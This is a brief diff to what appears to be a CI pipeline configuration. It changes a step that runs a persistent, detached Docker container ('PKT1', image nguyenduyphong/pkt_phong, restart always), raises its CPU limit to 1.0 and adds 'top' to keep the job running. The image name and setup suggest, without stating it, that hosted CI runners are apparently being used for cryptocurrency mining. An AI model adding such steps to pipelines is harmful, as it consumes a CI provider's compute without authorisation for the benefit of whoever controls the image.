@@ -5,4 +5,5 @@ jobs:
    steps:
      - checkout
      - run: 
-          sudo docker run -d --restart always --name PKT1 -it --cpus="0.5" --cpu-shares="512" nguyenduyphong/pkt_phong:tagname  
+          sudo docker run -d --restart always --name PKT1 -it --cpus="1.0" --cpu-shares="512" nguyenduyphong/pkt_phong:tagname
+          top  
